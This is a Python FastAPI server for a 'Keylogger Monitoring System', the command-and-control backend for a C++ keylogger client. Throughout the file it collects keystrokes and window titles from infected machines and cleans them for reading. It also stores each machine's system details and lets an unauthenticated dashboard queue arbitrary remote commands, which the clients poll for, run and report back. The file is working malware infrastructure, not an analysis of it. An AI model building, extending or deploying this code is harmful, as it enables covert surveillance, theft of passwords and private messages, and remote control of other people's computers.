import os
import logging
from fastapi import FastAPI, Request, HTTPException, Form, Query, Path, Depends
from fastapi.responses import JSONResponse, PlainTextResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any, Optional
import pymysql
from datetime import datetime, timedelta, timezone
import uuid
import dotenv
import queue
import re
import coloredlogs
import verboselogs

dotenv.load_dotenv()

logger = verboselogs.VerboseLogger("logger")
coloredlogs.install(
    level=verboselogs.VERBOSE, fmt="[%(asctime)s] | %(levelname)-6s | %(message)s"
)


DATABASE_HOST = os.getenv("DATABASE_HOST", "your_tidb_host")
DATABASE_PORT = int(os.getenv("DATABASE_PORT", 4000))
DATABASE_USER = os.getenv("DATABASE_USER", "your_tidb_user")
DATABASE_PASSWORD = os.getenv("DATABASE_PASSWORD", "your_tidb_password")
DATABASE_DB = os.getenv("DATABASE_DB", "keylogger_db")
TIDB_SSL_CERT_PATH = os.getenv("TIDB_SSL_CERT_PATH", "isrgrootx1.pem")

MAX_POOL_SIZE = 10
DB_CONNECT_TIMEOUT = 10
db_pool = queue.Queue(maxsize=MAX_POOL_SIZE)


def _create_raw_db_connection():
    try:
        ssl_params = {}
        if os.path.exists(TIDB_SSL_CERT_PATH):
            ssl_params = {"ca": TIDB_SSL_CERT_PATH}
        conn = pymysql.connect(
            host=DATABASE_HOST,
            port=DATABASE_PORT,
            user=DATABASE_USER,
            password=DATABASE_PASSWORD,
            db=DATABASE_DB,
            ssl=ssl_params if ssl_params else None,
            cursorclass=pymysql.cursors.DictCursor,
            connect_timeout=DB_CONNECT_TIMEOUT,
            read_timeout=30,
            write_timeout=30,
            charset="utf8mb4",
        )
        return conn
    except pymysql.MySQLError as e:
        logger.error(f"Failed to create new DB connection: {e}")
        return None
    except Exception as e:
        logger.error(
            f"An unexpected error occurred during raw DB connection creation: {e}"
        )
        return None


app = FastAPI(title="Keylogger Monitoring System", version="1.0")


@app.on_event("startup")
async def startup_db_pool():
    logger.info(f"Initializing database pool with max size {MAX_POOL_SIZE}...")
    for _ in range(MAX_POOL_SIZE):
        try:
            conn = _create_raw_db_connection()
            if conn:
                db_pool.put_nowait(conn)
            else:
                logger.warning(
                    "Failed to create a connection during pool initialization."
                )
        except queue.Full:
            break
        except Exception as e:
            logger.error(f"Error creating connection for pool: {e}")
    logger.info(f"Database pool initialized. Current size: {db_pool.qsize()}")


@app.on_event("shutdown")
async def shutdown_db_pool():
    logger.info("Closing database connections in pool...")
    closed_count = 0
    while not db_pool.empty():
        try:
            conn = db_pool.get_nowait()
            conn.close()
            closed_count += 1
        except queue.Empty:
            break
        except Exception as e:
            logger.error(f"Error closing connection from pool: {e}")
    logger.info(f"Database pool shutdown complete. Closed {closed_count} connections.")


async def get_db_connection_dependency():
    conn = None
    created_new_for_request = False
    try:
        try:
            conn = db_pool.get(timeout=0.5)
        except queue.Empty:
            logger.warning("DB Pool empty. Creating new temporary connection.")
            conn = _create_raw_db_connection()
            if conn:
                created_new_for_request = True
            else:
                raise HTTPException(
                    status_code=503,
                    detail="DB service unavailable: Could not create new connection.",
                )

        if not conn:
            raise HTTPException(
                status_code=503,
                detail="DB service unavailable: Failed to obtain connection.",
            )

        if not conn.open:
            logger.warning(f"Connection {id(conn)} from pool found closed. Recreating.")
            try:
                conn.close()
            except Exception:
                pass
            conn = _create_raw_db_connection()
            if not conn:
                raise HTTPException(
                    status_code=503,
                    detail="DB service unavailable: Failed to replace closed connection.",
                )
            created_new_for_request = True
        else:
            conn.ping(reconnect=True)
        yield conn
    except pymysql.MySQLError as e:
        logger.error(f"DB connection error: {e}")
        if conn and not created_new_for_request:
            try:
                conn.close()
            except Exception:
                pass
            conn = None
        raise HTTPException(status_code=503, detail=f"DB operation failed: {str(e)}")
    except Exception as e:
        logger.error(f"Unexpected error in DB dependency: {e}")
        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")
    finally:
        if conn and conn.open:
            if created_new_for_request:
                try:
                    db_pool.put_nowait(conn)
                except queue.Full:
                    logger.warning("DB Pool full. Closing temp connection.")
                    try:
                        conn.close()
                    except Exception:
                        pass
            else:
                try:
                    db_pool.put_nowait(conn)
                except queue.Full:
                    logger.error(
                        "DB Pool full when returning pooled connection. Closing."
                    )
                    try:
                        conn.close()
                    except Exception:
                        pass
        elif conn:
            try:
                conn.close()
            except Exception:
                pass


app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# --- Pydantic Models ---
class KeylogEntryResponse(BaseModel):  # MODIFIED
    log_id: str
    machine_id: str
    client_timestamp: Optional[str] = None
    server_timestamp: datetime
    window_title: str
    raw_log_data: Optional[str] = (
        None  # This will come from the 'log_data' column in DB
    )
    cleaned_log_data: Optional[str] = (
        None  # This will come from the 'cleaned_log_data' column
    )


class MachineInfo(BaseModel):
    machine_id: str
    computer_name: Optional[str] = None
    os_version: Optional[str] = None
    processor_arch: Optional[str] = None
    num_processors: Optional[int] = None
    total_ram_mb: Optional[int] = None
    first_seen: datetime
    last_seen: datetime
    reported_ip: Optional[str] = None


class SimpleMachineInfoForDashboard(BaseModel):
    id: str
    name: Optional[str] = None
    status: str
    cpu_usage: Optional[str] = "N/A"
    ram_usage: Optional[str] = "N/A"
    uptime: Optional[str] = "N/A"
    ip_address: Optional[str] = None
    last_seen: datetime


class CommandEntryResponse(BaseModel):
    command_id: str
    machine_id: str
    command: str
    status: str
    sent_timestamp: datetime
    executed_timestamp: Optional[datetime] = None
    completed_timestamp: Optional[datetime] = None
    output: Optional[str] = None
    error: Optional[str] = None


class CommandCreateRequest(BaseModel):
    machine_id: str
    command: str


class CommandCreateResponse(BaseModel):
    command_id: str
    status: str
    message: Optional[str] = None


# --- Helper Function for Cleaning Keylogs ---
def process_raw_keylogs_for_cleaning(raw_data: str) -> str:
    """
    Processes raw keylog data from the C++ client for a cleaner display.
    - Applies backspace logic.
    - Converts '_' to space.
    - Normalizes special key tags.
    """
    if raw_data is None:
        return ""

    output_buffer = []
    i = 0
    n = len(raw_data)

    while i < n:
        char = raw_data[i]

        if char == "[":
            match = re.match(r"\[([A-Z0-9_]+)\]", raw_data[i:])
            if match:
                special_key_full_tag = match.group(
                    0
                )  # The full tag, e.g., "[BACKSPACE]"
                special_key_name = match.group(1)  # The content, e.g., "BACKSPACE"
                i += len(special_key_full_tag)

                if special_key_name == "BACKSPACE":
                    if output_buffer:
                        output_buffer.pop()  # Remove the last character or tag
                elif special_key_name in ["LCONTROL", "RCONTROL", "CONTROL"]:
                    output_buffer.append("[CTRL]")
                elif special_key_name in ["LSHIFT", "RSHIFT", "SHIFT"]:
                    output_buffer.append("[SHIFT]")
                elif special_key_name in ["LWIN", "RWIN"]:
                    output_buffer.append("[WIN]")
                elif special_key_name == "MENU":  # VK_MENU is typically ALT
                    output_buffer.append("[ALT]")
                elif special_key_name == "RETURN":
                    output_buffer.append("[ENTER]")
                elif special_key_name == "TAB":
                    output_buffer.append("[TAB]")  # or "\t"
                else:
                    output_buffer.append(special_key_full_tag)
            else:
                output_buffer.append(char)
                i += 1
        elif char == "_":
            output_buffer.append(" ")
            i += 1
        else:
            output_buffer.append(char)
            i += 1

    cleaned = "".join(output_buffer)
    # print(f"Raw : {raw_data} | Clean: {cleaned}")
    return cleaned


# --- API Endpoints for C++ Logger ---
@app.post("/log", summary="Receive keylog data from C++ logger")
async def receive_log_data(
    request: Request,
    machine_id: str = Form(...),
    client_timestamp: str = Form(...),
    window_title: str = Form(...),
    raw_log_data_from_client: str = Form(..., alias="log_data"),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    client_ip = request.client.host if request.client else "Unknown IP"
    logger.info(f"Received log data from machine {machine_id} (IP: {client_ip})")

    cleaned_data = process_raw_keylogs_for_cleaning(raw_log_data_from_client)

    try:
        with conn.cursor() as cursor:
            cursor.execute(
                "SELECT machine_id FROM machines WHERE machine_id = %s", (machine_id,)
            )
            if cursor.fetchone() is None:
                cursor.execute(
                    "INSERT INTO machines (machine_id, reported_ip, computer_name, first_seen, last_seen) VALUES (%s, %s, %s, %s, %s)",
                    (
                        machine_id,
                        client_ip,
                        "Unknown (auto-created)",
                        datetime.now(),
                        datetime.now(),
                    ),
                )
                logger.warning(
                    f"Received logs for unknown machine: {machine_id}. Created minimal machine entry."
                )

            log_entry_id = str(uuid.uuid4())
            sql = """
                INSERT INTO keylogs (log_id, machine_id, client_timestamp_str, window_title, log_data, cleaned_log_data, server_timestamp)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            """
            cursor.execute(
                sql,
                (
                    log_entry_id,
                    machine_id,
                    client_timestamp,
                    window_title,
                    raw_log_data_from_client,
                    cleaned_data,
                    datetime.now(),
                ),
            )

            cursor.execute(
                "UPDATE machines SET last_seen = %s, reported_ip = %s WHERE machine_id = %s",
                (datetime.now(), client_ip, machine_id),
            )
            conn.commit()
        return JSONResponse(content={"message": "Log received"}, status_code=200)
    except pymysql.MySQLError as e:
        conn.rollback()
        logger.error(
            f"DB Error receiving log data for machine {machine_id}: {e}", exc_info=True
        )
        raise HTTPException(
            status_code=500, detail=f"Error processing log data (DB): {str(e)}"
        )
    except Exception as e:
        if hasattr(conn, "rollback"):
            conn.rollback()
        logger.error(
            f"General Error receiving log data for machine {machine_id}: {e}",
            exc_info=True,
        )
        raise HTTPException(
            status_code=500, detail=f"Error processing log data: {str(e)}"
        )


@app.post("/systeminfo", summary="Receive system information from C++ logger")
async def receive_system_info(
    request: Request,
    machine_id: str = Form(...),
    system_info: str = Form(...),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    client_ip = request.client.host if request.client else "Unknown IP"
    logger.info(f"Received system info from machine {machine_id} (IP: {client_ip})")
    try:
        with conn.cursor() as cursor:
            cursor.execute(
                "SELECT machine_id, computer_name FROM machines WHERE machine_id = %s",
                (machine_id,),
            )
            existing_machine = cursor.fetchone()
            computer_name = next(
                (
                    line.split(": ")[1]
                    for line in system_info.split("\n")
                    if line.startswith("Computer Name: ")
                ),
                None,
            )
            os_version = next(
                (
                    line.split(": ")[1]
                    for line in system_info.split("\n")
                    if line.startswith("OS Version: ")
                ),
                None,
            )
            processor_arch = next(
                (
                    line.split(": ")[1]
                    for line in system_info.split("\n")
                    if line.startswith("Processor Architecture: ")
                ),
                None,
            )
            num_processors_str = next(
                (
                    line.split(": ")[1]
                    for line in system_info.split("\n")
                    if line.startswith("Number of Processors: ")
                ),
                None,
            )
            num_processors = (
                int(num_processors_str)
                if num_processors_str and num_processors_str.isdigit()
                else None
            )
            total_ram_mb_str = next(
                (
                    line.split(": ")[1].replace(" MB", "")
                    for line in system_info.split("\n")
                    if line.startswith("Total Physical Memory: ")
                ),
                None,
            )
            total_ram_mb = (
                int(total_ram_mb_str)
                if total_ram_mb_str and total_ram_mb_str.isdigit()
                else None
            )

            if existing_machine:
                update_fields = {
                    "system_info_blob": system_info,
                    "last_seen": datetime.now(),
                    "reported_ip": client_ip,
                    "os_version": os_version,
                    "processor_arch": processor_arch,
                    "num_processors": num_processors,
                    "total_ram_mb": total_ram_mb,
                }
                if computer_name and (
                    existing_machine.get("computer_name") is None
                    or existing_machine.get("computer_name") == "Unknown"
                ):
                    update_fields["computer_name"] = computer_name
                elif computer_name:
                    update_fields["computer_name"] = computer_name
                set_clause = ", ".join([f"{key} = %s" for key in update_fields.keys()])
                values = list(update_fields.values()) + [machine_id]
                cursor.execute(
                    f"UPDATE machines SET {set_clause} WHERE machine_id = %s",
                    tuple(values),
                )
            else:
                cursor.execute(
                    "INSERT INTO machines (machine_id, computer_name, os_version, processor_arch, num_processors, total_ram_mb, reported_ip, system_info_blob, first_seen, last_seen) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)",
                    (
                        machine_id,
                        computer_name if computer_name else "Unknown",
                        os_version,
                        processor_arch,
                        num_processors,
                        total_ram_mb,
                        client_ip,
                        system_info,
                        datetime.now(),
                        datetime.now(),
                    ),
                )
            conn.commit()
        return JSONResponse(
            content={"message": "System info received"}, status_code=200
        )
    except pymysql.MySQLError as e:
        conn.rollback()
        logger.error(f"DB Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))
    except Exception as e:
        logger.error(f"General Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/command/result", summary="Receive command execution result")
async def receive_command_result(
    request: Request,
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    command_id = "Unknown"
    try:
        body = await request.body()
        result_string = body.decode("utf-8")
        parts = result_string.split("|", 3)
        if len(parts) < 2:
            raise HTTPException(status_code=400, detail="Malformed command result")
        command_id = parts[0]
        status_str = parts[1]
        valid_statuses = ["completed", "failed", "executing"]
        if status_str not in valid_statuses:
            status_str = "failed"
        output = parts[2] if len(parts) > 2 else ""
        error = parts[3] if len(parts) > 3 else ""
        with conn.cursor() as cursor:
            current_ts = datetime.now()
            cursor.execute(
                "UPDATE commands SET status = %s, executed_timestamp = COALESCE(executed_timestamp, %s), completed_timestamp = CASE WHEN %s IN ('completed', 'failed') THEN %s ELSE NULL END, output = %s, error = %s WHERE command_id = %s",
                (
                    status_str,
                    current_ts,
                    status_str,
                    current_ts,
                    output,
                    error,
                    command_id,
                ),
            )
            if cursor.rowcount == 0:
                conn.rollback()
                return JSONResponse(
                    content={"message": "Command ID not found"}, status_code=404
                )
            conn.commit()
        return JSONResponse(content={"message": "Command result received"})
    except HTTPException:
        raise
    except pymysql.MySQLError as e:
        conn.rollback()
        logger.error(f"DB Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))
    except Exception as e:
        logger.error(f"General Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/commands/pending", response_class=PlainTextResponse)
async def get_pending_commands_for_client(
    id: str = Query(...),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    response_string = ""
    try:
        with conn.cursor() as cursor:
            cursor.execute(
                "SELECT command_id, command FROM commands WHERE machine_id = %s AND status = 'pending' ORDER BY sent_timestamp ASC LIMIT 10",
                (id,),
            )
            pending_commands = cursor.fetchall()
            if pending_commands:
                ids_to_update = [cmd["command_id"] for cmd in pending_commands]
                placeholders = ",".join(["%s"] * len(ids_to_update))
                cursor.execute(
                    f"UPDATE commands SET status = 'executing', executed_timestamp = %s WHERE command_id IN ({placeholders})",
                    (datetime.now(), *ids_to_update),
                )
                conn.commit()
                for cmd in pending_commands:
                    response_string += f"{cmd['command_id'].replace('|','').replace(chr(10),'')}|{cmd['command'].replace('|','').replace(chr(10),'')}\n"
        return PlainTextResponse(content=response_string)
    except pymysql.MySQLError as e:
        logger.error(f"DB Error: {e}", exc_info=True)
        return PlainTextResponse(content="", status_code=500)
    except Exception as e:
        logger.error(f"General Error: {e}", exc_info=True)
        return PlainTextResponse(content="", status_code=500)


# --- Dashboard HTML Serving ---
@app.get("/", response_class=HTMLResponse, summary="Serve the main dashboard page")
async def serve_dashboard(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


# --- Dashboard API Endpoints ---
@app.get(
    "/dashboard/api/devices/{machine_id}/keylogs",
    response_model=List[KeylogEntryResponse],
    summary="Get keylogs for a specific machine",
)
async def dashboard_get_machine_logs(
    machine_id: str = Path(..., description="ID of the machine"),
    limit: int = Query(1000, ge=1, le=5000),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    logger.info(f"Dashboard: Fetching logs for machine {machine_id}, limit {limit}")
    try:
        with conn.cursor() as cursor:
            sql = """
                SELECT log_id, machine_id, client_timestamp_str as client_timestamp,
                       server_timestamp, window_title, 
                       log_data as raw_log_data,  -- Fetch original log_data as raw_log_data
                       cleaned_log_data          -- Fetch the new cleaned_log_data
                FROM keylogs
                WHERE machine_id = %s
                ORDER BY client_timestamp_str DESC
                LIMIT %s
            """
            cursor.execute(sql, (machine_id, limit))
            logs_data_db = cursor.fetchall()

        response_data = []
        for log_db in logs_data_db:
            response_data.append(
                KeylogEntryResponse(
                    log_id=log_db["log_id"],
                    machine_id=log_db["machine_id"],
                    client_timestamp=log_db.get("client_timestamp", ""),
                    server_timestamp=log_db["server_timestamp"],
                    window_title=log_db["window_title"],
                    raw_log_data=log_db.get("raw_log_data", ""),
                    cleaned_log_data=log_db.get("cleaned_log_data"),
                )
            )
        logger.info(
            f"Dashboard: Returning {len(response_data)} logs for machine {machine_id}"
        )
        return response_data
    except pymysql.MySQLError as e:
        logger.error(
            f"Dashboard: DB Error fetching logs for machine {machine_id}: {e}",
            exc_info=True,
        )
        raise HTTPException(
            status_code=500, detail=f"Error fetching logs (DB): {str(e)}"
        )
    except Exception as e:
        logger.error(
            f"Dashboard: General Error fetching logs for machine {machine_id}: {e}",
            exc_info=True,
        )
        raise HTTPException(status_code=500, detail=f"Error fetching logs: {str(e)}")


@app.get("/dashboard/api/devices", response_model=List[SimpleMachineInfoForDashboard])
async def dashboard_list_machines(
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    machine_list = []
    try:
        with conn.cursor() as cursor:
            cursor.execute(
                "SELECT machine_id, computer_name, reported_ip, last_seen, os_version, total_ram_mb FROM machines ORDER BY last_seen DESC"
            )
            machines_data = cursor.fetchall()
            for machine_db in machines_data:
                last_seen_dt = machine_db["last_seen"]
                if not isinstance(last_seen_dt, datetime):
                    last_seen_dt = datetime.min.replace(tzinfo=timezone.utc)
                elif last_seen_dt.tzinfo is None:
                    last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)
                status = "offline"
                current_aware_time = datetime.now(timezone.utc)
                if current_aware_time - last_seen_dt < timedelta(minutes=5):
                    status = "active"
                elif current_aware_time - last_seen_dt < timedelta(minutes=30):
                    status = "idle"
                ram_info = (
                    f"{machine_db.get('total_ram_mb')} MB Total"
                    if machine_db.get("total_ram_mb")
                    else "N/A"
                )
                machine_list.append(
                    SimpleMachineInfoForDashboard(
                        id=machine_db["machine_id"],
                        name=machine_db.get("computer_name", "Unknown"),
                        status=status,
                        ip_address=machine_db.get("reported_ip"),
                        last_seen=last_seen_dt,
                        cpu_usage="N/A",
                        ram_usage=ram_info,
                        uptime="N/A",
                    )
                )
        return machine_list
    except pymysql.MySQLError as e:
        logger.error(f"DB Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))
    except Exception as e:
        logger.error(f"General Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/dashboard/api/devices/{machine_id}/details")
async def dashboard_get_machine_system_info(
    machine_id: str = Path(...),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    try:
        with conn.cursor() as cursor:
            cursor.execute(
                "SELECT machine_id, computer_name, os_version, processor_arch, num_processors, total_ram_mb, first_seen, last_seen, reported_ip, system_info_blob FROM machines WHERE machine_id = %s",
                (machine_id,),
            )
            sys_info_db = cursor.fetchone()
            if not sys_info_db:
                raise HTTPException(status_code=404, detail="Machine not found")
            blob = sys_info_db.get("system_info_blob", "N/A (No blob)")
            formatted = f"Computer Name: {sys_info_db.get('computer_name', 'N/A')}\nOS Version: {sys_info_db.get('os_version', 'N/A')}\nArch: {sys_info_db.get('processor_arch', 'N/A')}\nCPUs: {sys_info_db.get('num_processors', 'N/A')}\nRAM: {sys_info_db.get('total_ram_mb', 'N/A')} MB\nIP: {sys_info_db.get('reported_ip', 'N/A')}\nFirst Seen: {sys_info_db['first_seen'].isoformat() if sys_info_db.get('first_seen') else 'N/A'}\nLast Seen: {sys_info_db['last_seen'].isoformat() if sys_info_db.get('last_seen') else 'N/A'}\n\n--- Full Info ---\n{blob}"
            response_data = {
                "machine_id": sys_info_db["machine_id"],
                "computer_name": sys_info_db.get("computer_name"),
                "os_version": sys_info_db.get("os_version"),
                "processor_arch": sys_info_db.get("processor_arch"),
                "num_processors": sys_info_db.get("num_processors"),
                "total_ram_mb": sys_info_db.get("total_ram_mb"),
                "first_seen": (
                    sys_info_db["first_seen"].isoformat()
                    if sys_info_db.get("first_seen")
                    else None
                ),
                "last_seen": (
                    sys_info_db["last_seen"].isoformat()
                    if sys_info_db.get("last_seen")
                    else None
                ),
                "reported_ip": sys_info_db.get("reported_ip"),
                "system_info_string_formatted": formatted,
                "system_info_blob": blob,
            }
        return JSONResponse(content=response_data)
    except pymysql.MySQLError as e:
        logger.error(f"DB Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))
    except Exception as e:
        logger.error(f"General Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@app.post(
    "/dashboard/api/devices/{machine_id}/command", response_model=CommandCreateResponse
)
async def dashboard_create_command(
    machine_id: str = Path(...),
    command_payload: Dict[str, str] = None,
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    if command_payload is None or "command" not in command_payload:
        raise HTTPException(status_code=400, detail="Command payload missing")
    command_str = command_payload["command"]
    try:
        with conn.cursor() as cursor:
            cursor.execute(
                "SELECT machine_id FROM machines WHERE machine_id = %s", (machine_id,)
            )
            if cursor.fetchone() is None:
                raise HTTPException(status_code=404, detail="Machine not found")
            command_id = str(uuid.uuid4())
            cursor.execute(
                "INSERT INTO commands (command_id, machine_id, command, status, sent_timestamp) VALUES (%s, %s, %s, %s, %s)",
                (command_id, machine_id, command_str, "pending", datetime.now()),
            )
            conn.commit()
        return CommandCreateResponse(
            command_id=command_id, status="pending", message="Command sent."
        )
    except HTTPException:
        conn.rollback()
        raise
    except pymysql.MySQLError as e:
        conn.rollback()
        logger.error(f"DB Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))
    except Exception as e:
        conn.rollback()
        logger.error(f"General Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@app.get(
    "/dashboard/api/devices/{machine_id}/commands",
    response_model=List[CommandEntryResponse],
)
async def dashboard_get_machine_commands(
    machine_id: str = Path(...),
    limit: int = Query(100, ge=1, le=1000),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency),
):
    try:
        with conn.cursor() as cursor:
            cursor.execute(
                "SELECT command_id, machine_id, command, status, sent_timestamp, executed_timestamp, completed_timestamp, output, error FROM commands WHERE machine_id = %s ORDER BY sent_timestamp DESC LIMIT %s",
                (machine_id, limit),
            )
            commands_data = cursor.fetchall()
        return commands_data
    except pymysql.MySQLError as e:
        logger.error(f"DB Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))
    except Exception as e:
        logger.error(f"General Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/dashboard/api/devices/{machine_id}/screenshot")
async def dashboard_get_machine_screenshot(machine_id: str = Path(...)):
    return JSONResponse(
        content={
            "timestamp": datetime.now().isoformat(),
            "screenshot_url": f"https://placehold.co/640x480/grey/white?text=Screenshot+{machine_id}\\n(Not+Implemented)",
        }
    )


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "app:app", host="0.0.0.0", port=8000, reload=True
    )
